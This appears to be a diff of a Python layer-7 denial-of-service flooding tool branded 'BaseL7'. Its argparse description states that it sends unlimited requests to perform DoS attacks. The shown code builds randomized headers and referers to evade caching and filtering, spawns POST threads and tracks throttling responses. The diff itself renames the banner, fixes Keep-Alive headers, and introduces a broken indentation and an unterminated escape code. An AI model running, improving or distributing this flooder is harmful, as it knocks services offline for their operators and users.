@@ -11,20 +11,20 @@ os.system( 'clear' )
 logo = """
 \033[33m════════════════════════════════════════════════════\033[0m
 
-   ████████▒▒        █████▒▒     ████████▒▒    ███████▒▒
-   ██▒▒    ██▒▒    ██▒▒   ██▒▒   ██▒▒  ██▒▒   ██▒▒
-   ██▒▒    ██▒▒    ██▒▒   ██▒▒   ██▒▒          ██▒▒
-   ██▒▒    ██▒▒    ██▒▒   ██▒▒   ██▒▒          ██▒▒
-   ██████▒▒        ██▒▒   ██▒▒   ████████▒▒    ██████▒▒
-   ██▒▒    ██▒▒    ██████ ██▒▒         ██▒▒    ██▒▒
-   ██▒▒    ██▒▒    ██▒▒   ██▒▒         ██▒▒    ██▒▒
-   ████████▒▒      ██▒▒   ██▒▒   ████████▒▒    ████████▒▒
+       ████████▒▒         █████▒▒       ████████▒▒     ███████▒▒
+       ██▒▒    ██▒▒     ██▒▒   ██▒▒     ██▒▒  ██▒▒    ██▒▒
+       ██▒▒    ██▒▒     ██▒▒   ██▒▒     ██▒▒           ██▒▒
+       ██▒▒    ██▒▒     ██▒▒   ██▒▒     ██▒▒           ██▒▒
+       ██████▒▒         ██▒▒   ██▒▒     ████████▒▒     ██████▒▒
+       ██▒▒    ██▒▒     ██████ ██▒▒           ██▒▒     ██▒▒
+       ██▒▒    ██▒▒     ██▒▒   ██▒▒           ██▒▒     ██▒▒
+       ████████▒▒       ██▒▒   ██▒▒     ████████▒▒     ████████▒▒
 
-█████▒▒   ████▒▒ ██▒▒  █▒▒█▒▒████▒▒ ████▒▒█████▒▒
-█▒▒       █▒▒    █▒█▒▒ █▒▒█▒▒█▒▒ █▒▒█▒▒   █▒▒  █▒▒   
-████▒▒    █████▒▒█▒▒█▒▒█▒▒█▒▒█▒▒ █▒▒███▒▒█▒▒  █▒▒
-█▒▒           █▒▒█▒▒ █▒█▒▒█▒▒████▒▒ █▒     ████▒▒
-█████▒▒   █████▒▒█▒▒  ██▒▒█▒▒█▒▒    ████▒▒█▒▒  █▒▒
+█████▒▒█▒▒      █▒▒██████▒▒█████▒▒   █████▒▒██▒▒  █▒▒█▒▒████▒▒ ████▒▒█████▒▒
+█▒▒     █▒▒      █▒▒   █▒▒   █▒▒       █▒▒     █▒█▒▒ █▒▒█▒▒█▒▒ █▒▒█▒▒   █▒▒  █▒▒
+████▒▒  █▒▒      █▒▒  █▒▒   ████▒▒    █████▒▒█▒▒█▒▒█▒▒█▒▒█▒▒ █▒▒███▒▒█▒▒   █▒▒
+█▒▒     █▒▒      █▒▒   █▒▒   █▒▒            █▒▒█▒▒ █▒█▒▒█▒▒████▒▒ █▒    ████▒▒
+█████▒▒ ██████▒▒█▒▒  █▒▒   █████▒▒   █████▒▒█▒▒  ██▒▒█▒▒█▒▒    ████▒▒█▒▒  █▒▒
 
 \033[93m══════════════════════════════════════════════════════\033[0m
 """
@@ -71,8 +71,8 @@ def initHeaders():
 				'Cache-Control': 'no-cache',
 				'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
 				'Referer': 'http://www.google.com/?q=' + randomString(random.randint(5,10)),
-				'Keef-Alife': str(random.randint(110,120)),
-				'Connection': 'Keef-Alife'
+				'Keep-Alive': str(random.randint(110,120)),
+				'Connection': 'keep-alive'
 				}
 
 	if additionalHeaders:
@@ -82,10 +82,10 @@ def initHeaders():
 
 def handleStatusCodes(status_code):
 	global request_counter
-	sys.stdout.write("\r%i \033[33requests sent" % request_counter)
+	sys.stdout.write("\r%i requests has been sent" % request_counter)
 	sys.stdout.flush()
 	if status_code == 429:
-		printMsg("\033[92mB A S E L7\033[0")
+			printMsg("You have been throttled")
 	if status_code == 500:
 		printedMsg("Status code 500 received")
 
@@ -132,10 +132,11 @@ class SendPOSTThread(threading.Thread):
 			pass
 
 
+# TODO:
 # check if the site stop responding and alert
 
 def main(argv):
-	parser = argparse.ArgumentParser(description='Sending unlimited amount of requests in order to perform DoS attacks.')
+	parser = argparse.ArgumentParser(description='Sending unlimited amount of requests in order to perform DoS attacks. BaseL7')
 	parser.add_argument('-g', help='Specify GET request. Usage: -g \'<url>\'')
 	parser.add_argument('-p', help='Specify POST request. Usage: -p \'<url>\'')
 	parser.add_argument('-d', help='Specify data payload for POST request', default=None)
@@ -164,4 +165,4 @@ def main(argv):
 		exit()
 	
 if __name__ == "__main__":
-   main(sys.argv[1:])
+   main(sys.argv[1:])			
